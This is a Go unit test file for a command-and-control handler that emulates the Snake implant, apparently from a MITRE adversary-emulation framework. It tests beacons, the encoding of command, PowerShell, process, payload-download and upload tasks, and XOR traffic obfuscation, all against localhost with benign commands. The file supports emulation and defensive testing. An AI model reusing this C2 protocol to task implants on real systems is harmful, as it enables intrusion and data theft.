package snake

import (
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"testing"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/restapi"
	"attackevals.mitre-engenuity.org/control_server/sessions"
)

const (
    handlerName = "snakehttp"
    restAPIlistenHost = "127.0.0.1:9993"
    restAPIBaseURL = "http://" + restAPIlistenHost + "/api/v1.0/"
    heartbeatURL = "http://127.0.0.1:8085/PUB/home.html"
    beaconBaseURL = "http://127.0.0.1:8085/PUB/"
    uploadBaseURL = "http://127.0.0.1:8085/IMAGES/3/"
    payloadRequestBaseURL = "http://127.0.0.1:8085/IMAGES/3/"
    heartbeatResponseWant = "1"
    emptyTaskWant = "ID555555555555555555#00 #25&&&"
    cmdTask = "{\"type\": 1, \"command\": \"whoami /all\"}" // d2hvYW1pIC9hbGw=
    cmdTaskRunas = "{\"type\": 1, \"command\": \"whoami /all\", \"runas\":\"testdomain\\\\testuser\"}" // d2hvYW1pIC9hbGw=
    pshTask = "{\"type\": 2, \"command\": \"get-childitem testing\"}" // ZwBlAHQALQBjAGgAaQBsAGQAaQB0AGUAbQAgAHQAZQBzAHQAaQBuAGcA
    pshTaskRunas = "{\"type\": 2, \"command\": \"get-childitem testing\", \"runas\":\"testdomain\\\\testuser\"}" // ZwBlAHQALQBjAGgAaQBsAGQAaQB0AGUAbQAgAHQAZQBzAHQAaQBuAGcA
    procTaskOnlyBinary = "{\"type\": 3, \"proc\": \"C:\\\\path\\\\to my\\\\binary.exe\"}"
    procTaskWithArgs = "{\"type\": 3, \"proc\": \"C:\\\\path\\\\to my\\\\binary.exe\", \"args\": \"arg1 arg2 argwith|special&characters#@\"}"
    procTaskWithArgsRunas = "{\"type\": 3, \"proc\": \"C:\\\\path\\\\to my\\\\binary.exe\", \"args\": \"arg1 arg2 argwith|special&characters#@\", \"runas\":\"testdomain\\\\testuser\"}"
    payloadTask = "{\"type\": 4, \"file\": \"test_payload\", \"dest\": \"C:\\\\dummy\\\\path\\\\payload\"}"
    fakePayloadTask = "{\"type\": 4, \"file\": \"nonexistent_payload\", \"dest\": \"CC:\\\\fake\\\\path\"}"
    uploadFileTask = "{\"type\": 5, \"file\": \"C:\\\\path\\\\to\\\\testfile.bin\"}"
    uploadLogsTask = "{\"type\": 6}"
    cmdTaskWant = "ID555555555555555555#01 &d2hvYW1pIC9hbGw=#25&&&"
    cmdTaskRunasWant = "ID555555555555555555#01 &d2hvYW1pIC9hbGw=#25&testdomain\\testuser&&"
    pshTaskWant = "ID555555555555555555#02 &ZwBlAHQALQBjAGgAaQBsAGQAaQB0AGUAbQAgAHQAZQBzAHQAaQBuAGcA#25&&&"
    pshTaskRunasWant = "ID555555555555555555#02 &ZwBlAHQALQBjAGgAaQBsAGQAaQB0AGUAbQAgAHQAZQBzAHQAaQBuAGcA#25&testdomain\\testuser&&"
    procTaskOnlyBinaryWant = "ID555555555555555555#03 &C:\\path\\to my\\binary.exe#25&&&"
    procTaskWithArgsWant = "ID555555555555555555#03 &C:\\path\\to my\\binary.exe&YXJnMSBhcmcyIGFyZ3dpdGh8c3BlY2lhbCZjaGFyYWN0ZXJzI0A=#25&&&"
    procTaskWithArgsRunasWant = "ID555555555555555555#03 &C:\\path\\to my\\binary.exe&YXJnMSBhcmcyIGFyZ3dpdGh8c3BlY2lhbCZjaGFyYWN0ZXJzI0A=#25&testdomain\\testuser&&"
    payloadTaskWant = "ID555555555555555555#04 &test_payload&C:\\dummy\\path\\payload#25&&&"
    uploadFileTaskWant = "ID555555555555555555#05 &C:\\path\\to\\testfile.bin#25&&&"
    uploadLogsTaskWant = "ID555555555555555555#06 #25&&&"
    invalidTaskBadCode = "{\"type\": 22, \"random\": \"askdjaskd\"}"
    invalidTaskSingleToken = "{\"type\": 1}"
    mockRandNum = 5
    testPayloadHash = "eb1a3227cdc3fedbaec2fe38bf6c044a"
    helloWorldElfHash = "fe7c47d38224529c7d8f9a11a62cdd7a"
    timeSuffixWant = ".2006-01-02-15-04-05.log"
    c2LogFileNameWant = c2LogFileName + timeSuffixWant
    executionLogFileNameWant = executionLogFileName + timeSuffixWant
    pipeServerLogFileNameWant = pipeServerLogFileName + timeSuffixWant
    pipeClientLogFileNameWant = pipeClientLogFileName + timeSuffixWant
    dummyLogDataWant = `this is dummy log data line 1
line 2
more lines
some long line some long line some long line some long line some long line some long line some long line some long line some long line some long line some long line some long line some long line some long line some long line
another line
`
    encodedEncryptedLogData = `RQ5QQxNZRhMOGQsME1MHAw0TXVFFWBBdWhsREAg=
XQ9XVRMC
XAlLVRNcXF0PHw==
QglUVRNcWl0NTAoIBBZLHwVeXBBdVl5WExkdXlwYFlhaHUgADgQMTB0ZAR9VFQAKDUlaW1xXGVQKDAhEEgQMC0QdBgEfFV9fVlwYGQYcD1AJWV5eEh8EAw5FBhtdVxlcWV8BGVxaXlATGQMLBEofBAINE1VZX1wQQlwYERBVVwtQFxQBAgRKGAMcFU8WGggIRwQAWFESQ1ZVBkIBCw8MQQINHwxPC1peUxhVVwQOUQYZC1MQSl0eCE0HChsTEF5QXlMRFVZdVhBZXAQLRg0DHQ5MGVxUVRFVX19UVRhZV10=
UAhWRFtVRxMGBQgE
`
    dummyLogDataHash = "7a17fb3a0fb26bdb9f53c252baeb6af1"
    dummyPlaintextData = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
    dummyCiphertextBase64 = "fQlLVV4QXEMZGQtBDhwHAxgTSllFGVFcVgFYEFpXC0RSGxwJFR8ZTBAUBgocFQwOBg4WUV5ZTRRDEQgAQQ8OTgEYHBwVWlcWTFxVGgYDShkLVVldWxcYAx9FAAAQXlhSWUMDGVVHEFFcBgMUBEoeCgsEUhlRXVBBRFJbVGVNGABZXhVIDQVKBgUfGQJaAwMBDgkEGhRDRVBLQwwCFxUZFApEFBEKClZaQllNUQUHUR8cCVddWl1TAQwJCgcdQxJXWUVYRkxEE1FZWhsZDxFKFhNMD1IZU15UXV5XGlRTVlYWUkYNCRhPSi8ZGANPGwASCkcBG0NGVxBdVw8NH0QIBUEcAQEbChBQXVJdS1EeSRgEUBNZXExCBwwZDkUDEVxbTRBTQhVcEFBZWV8fAUYFBR8EHg8TXEURX0VWWhQAEFdNCVtWWBgNEwMKGAQCQVowHgwCGB1TQUAQSlENFk0LAggACwcQHU8bQENfXFhMCx1RBB8LFkBLXRoJCAURWVRDR1dEFlgIGVNGXEVSSh0TCEocDQoDUFBREV1VQlYHAV5NGAhYWxQBGEELBQUcUAYeVQMcE0gFV1ZdQkxVTQ=="
    
)

// exampleBeacon shows how to construct a well formed beacon
var exampleBeacon = sessions.Session{
    GUID:     "snake-implant-123",
    IPAddr:   "127.0.0.1",
    HostName: "myHostName",
    User:     "myUserName",
    Dir:      "C:\\MyDir\\",
    PID:      1234,
    PPID:     4,
    Task:     nil,
}


var configEntry = config.HandlerConfigEntry{
    "host": "127.0.0.1",
    "port": "8085",
}

func mockGetRandIntn(int) int {
    return mockRandNum
}

func mockGetUtcTimeNow() time.Time {
    t, _ := time.Parse(time.RFC3339, "2006-01-02T15:04:05Z")
    return t.UTC()
}

func generateMockedSnakeHandler() *SnakeHttpHandler {
    mockFuncHandles := &SnakeWrappedFuncHandles {
        randIntnGetter: mockGetRandIntn,
        utcTimeNowGetter: mockGetUtcTimeNow,
    }
    return snakeHttpHandlerFactory(mockFuncHandles)
}

func startSnakeHttpHandler(handler *SnakeHttpHandler, t *testing.T) {
    if err := handler.StartHandler(restAPIlistenHost, configEntry); err != nil {
        t.Errorf("Error when starting Snake HTTP handler: %s", err.Error())
    }
    util.RunningHandlers[handlerName] = handler
    time.Sleep(50 * time.Millisecond)
}

func stopSnakeHttpHandler(handler *SnakeHttpHandler, t *testing.T) {
    if err := handler.StopHandler(); err != nil {
        t.Errorf("Error when stopping Snake HTTP handler: %s", err.Error())
    }
    delete(util.RunningHandlers, handlerName)
    time.Sleep(50 * time.Millisecond)
}

func startRESTAPI(t *testing.T) {
    restapi.Start(restAPIlistenHost, "./test_payloads")
    time.Sleep(50 * time.Millisecond)
    t.Log("Started REST API server")
}

func stopRESTAPI(t *testing.T) {
    restapi.Stop()
    time.Sleep(50 * time.Millisecond)
    t.Log("Stopped REST API server")
}

func TestStartStopSnakeHttpHandler(t *testing.T) {
    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
}

func sendHeartbeat(t *testing.T) []byte {
    response, err := http.Get(heartbeatURL)
    if err != nil {
        t.Error(err)
    }
    defer response.Body.Close()
    body, err := ioutil.ReadAll(response.Body)
    if err != nil {
        t.Error(err)
    }
    return body
}

func sendImplantBeacon(t *testing.T, guid string) []byte {
    url := beaconBaseURL + guid
    response, err := http.Get(url)
    if err != nil {
        t.Error(err)
    }
    defer response.Body.Close()
    body, err := ioutil.ReadAll(response.Body)
    if err != nil {
        t.Error(err)
    }
    return xorData(body)
}

func setTask(task string, guid string) (string, error) {
    url := restAPIBaseURL + "session/" + guid + "/task"
    
    // setup HTTP POST request
    req, err := http.NewRequest("POST", url, bytes.NewBufferString(task))
    if err != nil {
        return "", err
    }

    // execute HTTP POST and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", fmt.Errorf("Expected error code 200, got %v", response.StatusCode)
    }
    body, err := ioutil.ReadAll(response.Body)
    return string(body[:]), err
}

func setAndGetTask(t *testing.T, task, guid string) string{
    _, err := setTask(task, guid)
    if err != nil {
        t.Error(err)
        return ""
    }
    return string(sendImplantBeacon(t, guid))
}

func setAndGetTaskCheckOutput(t *testing.T, task, guid, expectedOutput string) {
    result := setAndGetTask(t, task, guid)
    if result != expectedOutput {
        t.Errorf("Got '%s' expected '%s'", result, expectedOutput)
    }
}

func TestHandleHeartbeat(t *testing.T) {
    // start REST API
    startRESTAPI(t)
    defer stopRESTAPI(t)
    
    handler := generateMockedSnakeHandler()
    
    // start handler
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)

    // Send heartbeat file request. Expecting "1" response.
    body := sendHeartbeat(t)
    if string(body) != heartbeatResponseWant {
        t.Errorf("Got '%s' expected '%s'", string(body), heartbeatResponseWant)
    }
}

func TestHasImplantSessionAndStoreImplantSession(t *testing.T) {
    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    if handler.hasImplantSession("bogus-id") {
        t.Error("Implant bogus-id should not have an active session.")
    }
    guid := "implant1"
    err := handler.storeImplantSession(guid)
    if err != nil {
        t.Error(err.Error())
    }
    if !handler.hasImplantSession(guid) {
        t.Error("Expected implant session to be stored.")
    }
    err = handler.storeImplantSession(guid)
    want := fmt.Sprintf("Session %s already exists.", guid)
    if err != nil {
        if err.Error() != want {
            t.Errorf("Expected error message: %s; got: %s", want, err.Error())
        }
    } else {
        t.Error("Expected error message.")
    }
}

func TestCreateNewSessionDataBytes(t *testing.T) {
    guid := "test-implant-id"
    want := "{\"guid\":\"test-implant-id\"}"
    result := string(createNewSessionDataBytes(guid))
    if result != want {
        t.Errorf("Expected %s; got: %s", want, result)
    }
}

func TestHandleBeaconBasic(t *testing.T) {
    // start REST API
    startRESTAPI(t)
    defer stopRESTAPI(t)
    
    // Start handler
    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    if handler.hasImplantSession(exampleBeacon.GUID) {
        t.Error("Implant should not have an active session before sending first beacon")
    }

    // Send Beacon to establish session. Expecting empty-task response
    body := sendImplantBeacon(t, exampleBeacon.GUID)
    if string(body) != emptyTaskWant {
        t.Errorf("Got '%v' expected '%s'", body, emptyTaskWant)
    }
    
    // make sure session was added
    if !handler.hasImplantSession(exampleBeacon.GUID) {
        t.Error("Expected session to be stored in handler.")
    }
    
    // Test subsequent beacons with empty task responses
    for i := 1; i <= 10; i++ {
        body = sendImplantBeacon(t, exampleBeacon.GUID)
        if string(body) != emptyTaskWant {
            t.Errorf("Got '%v' expected '%s'", body, emptyTaskWant)
        }
    }
    
    // cmd task
    setAndGetTaskCheckOutput(t, cmdTask, exampleBeacon.GUID, cmdTaskWant)
    
    // No task available
    body = sendImplantBeacon(t, exampleBeacon.GUID)
    if string(body) != emptyTaskWant {
        t.Errorf("Got '%v' expected '%s'", string(body), emptyTaskWant)
    }
    
    // cmd task to run as diff user
    setAndGetTaskCheckOutput(t, cmdTaskRunas, exampleBeacon.GUID, cmdTaskRunasWant)
    
    // psh task
    setAndGetTaskCheckOutput(t, pshTask, exampleBeacon.GUID, pshTaskWant)
    
    // psh task to run as diff user
    setAndGetTaskCheckOutput(t, pshTaskRunas, exampleBeacon.GUID, pshTaskRunasWant)
    
    // proc task just binary
    setAndGetTaskCheckOutput(t, procTaskOnlyBinary, exampleBeacon.GUID, procTaskOnlyBinaryWant)
    
    // proc task with args
    setAndGetTaskCheckOutput(t, procTaskWithArgs, exampleBeacon.GUID, procTaskWithArgsWant)
    
    // proc task with args, ruj as diff user
    setAndGetTaskCheckOutput(t, procTaskWithArgsRunas, exampleBeacon.GUID, procTaskWithArgsRunasWant)
    
    // upload logs task
    setAndGetTaskCheckOutput(t, uploadLogsTask, exampleBeacon.GUID, uploadLogsTaskWant)
    
    // payload download task
    setAndGetTaskCheckOutput(t, payloadTask, exampleBeacon.GUID, payloadTaskWant)
    
    // file upload task
    setAndGetTaskCheckOutput(t, uploadFileTask, exampleBeacon.GUID, uploadFileTaskWant)
    
    // Bad Task type code
    _, err := setTask(invalidTaskBadCode, exampleBeacon.GUID)
    if err != nil {
        t.Error(err)
    }
    body = xorData(sendImplantBeacon(t, exampleBeacon.GUID))
    if string(body) != serverErrMsg {
        t.Errorf("Got '%s' expected '%s'", string(body), serverErrMsg)
    }
    
    // Bad Task insufficient args
    _, err = setTask(invalidTaskSingleToken, exampleBeacon.GUID)
    if err != nil {
        t.Error(err)
    }
    body = xorData(sendImplantBeacon(t, exampleBeacon.GUID))
    if string(body) != serverErrMsg {
        t.Errorf("Got '%s' expected '%s'", string(body), serverErrMsg)
    }
}

func convertAndCheckTask(handler *SnakeHttpHandler, t *testing.T, guid, task, want string) {
    response, err := handler.convertTaskToResponse(guid, task)
    if response != want {
        t.Errorf("Expected %s; got: %s", want, response)
    }
    if err != nil {
        t.Errorf("Expected no error, got: %s", err.Error())
    }
}

func TestConvertTaskToResponseBasic(t *testing.T) {
    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    // Test getting task for nonexistent implant session
    want := fmt.Sprintf("No existing session for implant %s.", exampleBeacon.GUID)
    response, err := handler.convertTaskToResponse(exampleBeacon.GUID, cmdTask)
    if len(response) > 0 {
        t.Errorf("Expected empty response string, got %s", response)
    }
    if err == nil {
        t.Error("Expected error, got nil")
    } else {
        if err.Error() != want {
            t.Errorf("Expected error message: %s; got: %s", want, err.Error())
        }
    }
    handler.storeImplantSession(exampleBeacon.GUID)
    
    // First task
    convertAndCheckTask(handler, t, exampleBeacon.GUID, cmdTask, cmdTaskWant)
    
    // Empty task
    response, err = handler.convertTaskToResponse(exampleBeacon.GUID, "")
    if response != emptyTaskWant {
        t.Errorf("Expected %s; got: %s", emptyTaskWant, response)
    }
    if err != nil {
        t.Errorf("Expected no error, got: %s", err.Error())
    }
    
    // Second Task
    convertAndCheckTask(handler, t, exampleBeacon.GUID, pshTask, pshTaskWant)
    
    // payload task
    convertAndCheckTask(handler, t, exampleBeacon.GUID, payloadTask, payloadTaskWant)
    
    // proc task just binary
    convertAndCheckTask(handler, t, exampleBeacon.GUID, procTaskOnlyBinary, procTaskOnlyBinaryWant)
    
    // proc task with args
    convertAndCheckTask(handler, t, exampleBeacon.GUID, procTaskWithArgs, procTaskWithArgsWant)
    
    // Upload file task
    convertAndCheckTask(handler, t, exampleBeacon.GUID, uploadFileTask, uploadFileTaskWant)
    
    // upload logs task
    convertAndCheckTask(handler, t, exampleBeacon.GUID, uploadLogsTask, uploadLogsTaskWant)
    
    // cmd task to run as diff user
    convertAndCheckTask(handler, t, exampleBeacon.GUID, cmdTaskRunas, cmdTaskRunasWant)
    
    // psh task to run as diff user
    convertAndCheckTask(handler, t, exampleBeacon.GUID, pshTaskRunas, pshTaskRunasWant)
    
    // proc with args task to run as diff user
    convertAndCheckTask(handler, t, exampleBeacon.GUID, procTaskWithArgsRunas, procTaskWithArgsRunasWant)
    
    // Bad task type code
    response, err = handler.convertTaskToResponse(exampleBeacon.GUID, invalidTaskBadCode)
    want = "Unsupported task code 22"
    if len(response) > 0 {
        t.Errorf("Expected empty response string, got %s", response)
    }
    if err == nil {
        t.Error("Expected error, got nil")
    } else {
        if err.Error() != want {
            t.Errorf("Expected error message: %s; got: %s", want, err.Error())
        }
    }
    
    // bad task - not enough args
    response, err = handler.convertTaskToResponse(exampleBeacon.GUID, invalidTaskSingleToken)
    want = "Task code 01 requires a command"
    if len(response) > 0 {
        t.Errorf("Expected empty response string, got %s", response)
    }
    if err == nil {
        t.Error("Expected error, got nil")
    } else {
        if err.Error() != want {
            t.Errorf("Expected error message: %s; got: %s", want, err.Error())
        }
    }
}

func sendPostAndCheckResponse(t *testing.T, url string, output []byte, expectedResponse string, expectedStatusCode int) {
    // setup HTTP POST request
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(output))
    if err != nil {
        t.Error(err)
    }

    // execute HTTP POST and read response
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        t.Error(err)
    }
    defer response.Body.Close()

    if response.StatusCode != expectedStatusCode {
        t.Errorf("Expected error code expected %d, got %v", expectedStatusCode, response.StatusCode)
    }

    body, err := ioutil.ReadAll(response.Body)
    if err != nil {
        t.Error(err)
    }

    if string(body) != expectedResponse {
        t.Errorf("Expected \"%v\", got \"%v\"", expectedResponse, string(body))
    }
}

func TestPostCommandOutputToServer(t *testing.T) {
    testInstructionId := "555555555555555555"
    dummyOutputData := []byte{0x45,0x0c,0x24,0x40,0x55,0x1c,0x47,0x4a,0x44,0x29,0x1a,0x51,0x53,0x0e,0x1b,0x0f,0x0e,0x0e,0x4c,0x27,0x1e,0x08,0x19,0x55,0x28,0x53,0x6a,0x16,0x00,0x21,0x19,0x41,0x19}
    
    // set current working directory to main repo directory to access ./files
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(t)
    defer stopRESTAPI(t)

    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    // Send Beacon to establish session. Expecting empty-task response
    body := sendImplantBeacon(t, exampleBeacon.GUID)
    if string(body) != emptyTaskWant {
        t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
    }
    
    // set instruction for task
    setAndGetTaskCheckOutput(t, pshTask, exampleBeacon.GUID,  pshTaskWant)

    // perform upload
    sendPostAndCheckResponse(t, uploadBaseURL + testInstructionId, dummyOutputData, "1", 200)
}

func TestUploadFile(t *testing.T) {
    testInstructionId := "555555555555555555"
    
    // set current working directory to main repo directory to access ./files
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(t)
    defer stopRESTAPI(t)

    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    // Send Beacon to establish session. Expecting empty-task response
    body := sendImplantBeacon(t, exampleBeacon.GUID)
    if string(body) != emptyTaskWant {
        t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
    }
    
    // set instruction for upload
    setAndGetTaskCheckOutput(t, uploadFileTask, exampleBeacon.GUID, uploadFileTaskWant)
    
    // read file data for upload
    testFile := "./test_payloads/hello_world.elf"
    fileNameOnUpload := "testfile.bin"
    fileData, err := ioutil.ReadFile(testFile)
    if err != nil {
        t.Error(err)
    }

    // perform upload
    sendPostAndCheckResponse(t, uploadBaseURL + testInstructionId, xorData(fileData), "1", 200)
    
    // confirm file made it to disk properly and verify hash
    compareUploadedFile(t, fileNameOnUpload, helloWorldElfHash)
}

func TestUploadLogs(t *testing.T) {    
    // set current working directory to main repo directory to access ./files
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(t)
    defer stopRESTAPI(t)

    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    // Send Beacon to establish session. Expecting empty-task response
    body := sendImplantBeacon(t, exampleBeacon.GUID)
    if string(body) != emptyTaskWant {
        t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
    }
    
    // set instruction for uploading logs
    setAndGetTaskCheckOutput(t, uploadLogsTask, exampleBeacon.GUID, uploadLogsTaskWant)
    
    // read file data for upload
    encoded := []byte(encodedEncryptedLogData)

    // perform upload for c2 log file
    sendPostAndCheckResponse(t, uploadBaseURL + c2LogId, encoded, "1", 200)
    compareUploadedFile(t, c2LogFileNameWant, dummyLogDataHash)
    
    // perform upload for execution log file
    sendPostAndCheckResponse(t, uploadBaseURL + executionLogId, encoded, "1", 200)
    compareUploadedFile(t, executionLogFileNameWant, dummyLogDataHash)
    
    // perform upload for pipe server log file
    sendPostAndCheckResponse(t, uploadBaseURL + pipeServerLogId, encoded, "1", 200)
    compareUploadedFile(t, pipeServerLogFileNameWant, dummyLogDataHash)
    
    // perform upload for pipe client log file
    sendPostAndCheckResponse(t, uploadBaseURL + pipeClientLogId, encoded, "1", 200)
    compareUploadedFile(t, pipeClientLogFileNameWant, dummyLogDataHash)
}

func compareUploadedFile(t *testing.T, targetName string, targetHash string) {
    uploadedFile := "./files/" + targetName
    defer cleanupFile(t, uploadedFile)
    uploadedData, err := ioutil.ReadFile(uploadedFile)
    if err != nil {
        t.Error(err)
    }
    
    h := md5.Sum(uploadedData)
    actualHash := hex.EncodeToString(h[:])
    if targetHash != actualHash {
        t.Errorf("Expected %v, got %v", targetHash, actualHash)
    }
}

func cleanupFile(t *testing.T, uploadedFile string) {
    // clean up test file
    err := os.Remove(uploadedFile)
    if err != nil {
        t.Error(err)
    }
}

func TestDownloadPayload(t *testing.T) {
    // set current working directory to main repo directory
    // this is needed so that the unit tests can find the requested payload
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(t)
    defer stopRESTAPI(t)

    // start handler
    handler := generateMockedSnakeHandler()
    startSnakeHttpHandler(handler, t)
    defer stopSnakeHttpHandler(handler, t)
    
    // Send Beacon to establish session. Expecting empty-task response
    body := sendImplantBeacon(t, exampleBeacon.GUID)
    if string(body) != emptyTaskWant {
        t.Errorf("Got '%s' expected '%s'", string(body), emptyTaskWant)
    }

    // test downloading a payload for a nonexistent instruction ID
    url := payloadRequestBaseURL + "555555555555555555"
    resp, err := http.Get(url)
    if err != nil {
        t.Error(err)
    }
    defer resp.Body.Close()
    if resp.StatusCode != 500 {
        t.Errorf("Expected error code 500, got %v", resp.StatusCode)
    }
    body, err = ioutil.ReadAll(resp.Body)
    if err != nil {
        t.Error(err)
    }
    if string(body) != serverErrMsg {
        t.Errorf("Expected message %s; got %s", serverErrMsg, string(body))
    }
    
    // register instruction for payload download
    setAndGetTaskCheckOutput(t, payloadTask, exampleBeacon.GUID, payloadTaskWant)
    resp2, err := http.Get(url)
    if err != nil {
        t.Error(err)
    }
    defer resp2.Body.Close()
    
    // read test file bytes
    fileData, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        t.Error(err)
    }

    // compare file hashes
    h := md5.Sum(xorData(fileData))
    actualHash := hex.EncodeToString(h[:])
    if testPayloadHash != actualHash {
        t.Errorf("Expected %v, got %v", testPayloadHash, actualHash)
    }

    // Test nonexistent file
    setAndGetTask(t, fakePayloadTask, exampleBeacon.GUID)
    resp3, err := http.Get(url)
    if err != nil {
        t.Error(err)
    }
    defer resp3.Body.Close()
    if resp3.StatusCode != 500 {
        t.Errorf("Expected error code 500, got %v", resp3.StatusCode)
    }
    body, err = ioutil.ReadAll(resp3.Body)
    if err != nil {
        t.Error(err)
    }
    if string(body) != serverErrMsg {
        t.Errorf("Expected message %s; got %s", serverErrMsg, string(body))
    }
}

func TestXor(t *testing.T) {
    encoded := xorData([]byte(dummyPlaintextData))
    encodedBase64 := base64.StdEncoding.EncodeToString(encoded)
    if encodedBase64 != dummyCiphertextBase64 {
        t.Errorf("Expected ciphertext %s; got %s", dummyCiphertextBase64, encodedBase64)
    }
    decoded := xorData(encoded)
    if string(decoded) != dummyPlaintextData {
        t.Errorf("Expected decrypted plaintext %s; got %v", dummyPlaintextData, decoded)
    }
}
